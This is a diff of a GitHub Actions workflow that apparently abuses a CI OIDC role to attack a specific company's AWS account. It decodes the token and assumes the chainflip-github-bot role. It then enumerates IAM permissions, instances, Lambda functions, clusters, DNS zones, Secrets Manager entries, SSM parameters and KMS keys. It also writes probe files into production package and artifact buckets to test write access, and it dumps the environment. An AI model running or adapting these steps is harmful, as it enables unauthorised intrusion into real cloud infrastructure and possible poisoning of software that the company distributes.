@@ -16,25 +16,42 @@ jobs:
           echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null || true
           echo
       - name: seat
-        run: id; hostname; cat /etc/hostname; uname -a; curl -s -m 5 http://169.254.169.254/latest/meta-data/instance-id || true
-      - name: assume A
+        run: id; hostname; uname -a; ls -la / | head -30; cat /proc/self/cgroup 2>/dev/null | head -3
+      - name: assume
         continue-on-error: true
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::962042992619:role/chainflip-github-bot
           aws-region: eu-central-1
-      - name: aws A
+      - name: aws identity and permissions
         continue-on-error: true
         run: |
           aws sts get-caller-identity
-          aws iam list-attached-role-policies --role-name chainflip-github-bot 2>&1 | head -30
+          aws iam get-role --role-name chainflip-github-bot
+          aws iam list-attached-role-policies --role-name chainflip-github-bot
+          aws iam list-role-policies --role-name chainflip-github-bot
+      - name: aws estate
+        continue-on-error: true
+        run: |
+          aws s3 ls
+          aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' --output text | head -40
+          aws lambda list-functions --query 'Functions[].[FunctionName,Runtime]' --output text | head -20
+          aws ecr describe-repositories --query 'repositories[].repositoryName' --output text
+          aws eks list-clusters --output text
+          aws autoscaling describe-auto-scaling-groups --query 'AutoScalingGroups[].[AutoScalingGroupName,Instances[].InstanceId]' --output text | head -20
+          aws route53 list-hosted-zones --query 'HostedZones[].[Name,Id]' --output text
+      - name: aws secrets
+        continue-on-error: true
+        run: |
+          aws secretsmanager list-secrets --query 'SecretList[].[Name,ARN]' --output text | head -40
+          aws ssm describe-parameters --max-items 30 --query 'Parameters[].[Name,Type]' --output text
+          aws kms list-keys --query 'Keys[].KeyId' --output text | head
+      - name: write probe
+        continue-on-error: true
+        run: |
           aws s3api put-object --bucket apt.aws.chainflip.xyz --key w5probe/oidc.txt --body /etc/hostname && echo PUT_DEV_OK
           aws s3api put-object --bucket chainflip-mainnet-prerelease --key w5probe/oidc.txt --body /etc/hostname && echo PUT_PRE_OK
           aws s3api put-object --bucket repo.chainflip.io --key w5probe/oidc.txt --body /etc/hostname && echo PUT_PROD_OK
-          aws s3 ls
-          aws secretsmanager list-secrets 2>&1 | head -40
-          aws ssm describe-parameters --max-items 20 2>&1 | head -30
-          aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' --output text 2>&1 | head -40
-          aws lambda list-functions --query 'Functions[].[FunctionName,Runtime]' --output text 2>&1 | head -20
+          aws s3api put-object --bucket artifacts.chainflip.io --key w5probe/oidc.txt --body /etc/hostname && echo PUT_ART_OK
       - name: env
         run: env | sort
